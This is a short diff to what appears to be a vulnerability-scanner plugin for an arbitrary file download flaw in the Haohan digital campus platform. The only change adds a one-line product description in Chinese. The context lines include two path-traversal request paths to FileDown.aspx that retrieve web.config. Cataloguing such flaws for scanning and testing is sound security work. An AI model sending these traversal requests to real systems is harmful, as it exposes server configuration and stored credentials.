@@ -12,6 +12,7 @@ class Vuln(ABVuln):
     type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-06-24'  # 漏洞公布时间
     desc = '''
+        皓翰数字化校园平台是由浙江皓翰教育科技有限公司推出的一款校园管理软件。
         皓翰数字化校园平台通用型3处任意文件下载。
         '/IneduPortal/Components/news/FileDown.aspx?OldName=web.config&NewName=../web.config',
         '/Inedu3In1/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config',
